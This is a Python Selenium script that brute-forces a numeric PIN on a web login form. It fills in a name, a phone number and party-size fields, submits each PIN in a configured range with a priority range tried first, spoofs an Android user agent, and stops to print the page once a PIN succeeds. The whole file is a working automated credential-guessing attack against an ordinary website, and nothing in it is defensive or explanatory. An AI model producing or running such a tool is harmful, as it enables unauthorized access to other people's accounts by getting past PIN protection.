import time
import sys
from enum import Enum

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException

import settings


class ResponseState(Enum):
    FORM    = "form"
    FAIL    = "fail"
    SUCCESS = "success"
    ERROR   = "error"


def make_driver() -> webdriver.Chrome:
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    # Spoof user agent to Android
    options.add_argument(
        "user-agent=Mozilla/5.0 (Linux; Android 14; Pixel 8) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/122.0.6261.119 Mobile Safari/537.36"
    )
    return webdriver.Chrome(options=options)


def classify(driver: webdriver.Chrome) -> ResponseState:
    try:
        body = driver.find_element(By.TAG_NAME, "body").text.lower()
    except Exception:
        return ResponseState.ERROR

    if "pin is not correct" in body:
        return ResponseState.FAIL

    current_url = driver.current_url.split("?")[0]
    original_url = settings.URL.split("?")[0]
    if current_url == original_url:
        return ResponseState.FORM

    return ResponseState.SUCCESS


def fill_and_submit(driver: webdriver.Chrome, wait: WebDriverWait, pin: int):
    driver.get(settings.URL)

    wait.until(EC.presence_of_element_located((By.NAME, "txtName")))

    if settings.MY_NAME:
        driver.find_element(By.NAME, "txtName").clear()
        driver.find_element(By.NAME, "txtName").send_keys(settings.MY_NAME)

    driver.find_element(By.NAME, "txtMobile").clear()
    driver.find_element(By.NAME, "txtMobile").send_keys(settings.PHONE)

    driver.find_element(By.NAME, "txtPin").clear()
    driver.find_element(By.NAME, "txtPin").send_keys(str(pin))

    try:
        Select(driver.find_element(By.NAME, "DDLP1")).select_by_value(str(settings.ADULTS))
    except NoSuchElementException:
        pass

    try:
        # DDLP2 values are offset: value="1" means 0 children, value="2" means 1 child, etc.
        Select(driver.find_element(By.NAME, "DDLP2")).select_by_value(str(settings.CHILDREN + 1))
    except NoSuchElementException:
        pass

    driver.find_element(By.NAME, "btnLogin").click()

    # Wait for page to react
    time.sleep(1)


def main():
    if not settings.PHONE:
        print("[!] PHONE is not set in .env")
        sys.exit(1)

    full_range = range(settings.PIN_START, settings.PIN_END + 1)
    priority = settings.PRIORITY_RANGE or range(0, 0)
    priority_set = set(priority)
    pin_sequence = list(priority) + [p for p in full_range if p not in priority_set]
    total = len(pin_sequence)

    print(f"[*] Name  : {settings.MY_NAME or '(not set)'}")
    print(f"[*] Phone : {settings.PHONE}")
    print(f"[*] Adults: {settings.ADULTS}  Children: {settings.CHILDREN}")
    print(f"[*] PIN range: {settings.PIN_START} – {settings.PIN_END}")
    if settings.PRIORITY_RANGE:
        print(f"[*] Priority range: {settings.PRIORITY_RANGE.start} – {settings.PRIORITY_RANGE.stop - 1} (tried first)")
    print(f"[*] Opening browser...\n")

    driver = make_driver()
    wait = WebDriverWait(driver, 10)

    try:
        for i, pin in enumerate(pin_sequence, 1):
            pct = i / total * 100
            print(f"\r[{i}/{total}] {pct:.1f}%  Trying PIN: {pin:05d}", end="", flush=True)

            try:
                fill_and_submit(driver, wait, pin)
            except (NoSuchElementException, TimeoutException) as e:
                print(f"\n[!] Error on PIN {pin}: {e}")
                time.sleep(2)
                continue

            state = classify(driver)
            print(f"\r[{i}/{total}] {pct:.1f}%  Trying PIN: {pin:05d} | {state.value}", end="", flush=True)

            if state == ResponseState.SUCCESS:
                print(f"\n\n[+] SUCCESS! PIN found: {pin}")
                print(f"[+] Current URL: {driver.current_url}")
                print(f"[+] Page text: {driver.find_element(By.TAG_NAME, 'body').text[:300]}")
                input("\nPress Enter to close the browser...")
                return

            if settings.DELAY > 0:
                time.sleep(settings.DELAY)

        print(f"\n\n[-] No valid PIN found in range {settings.PIN_START}–{settings.PIN_END}.")

    finally:
        driver.quit()


if __name__ == "__main__":
    main()
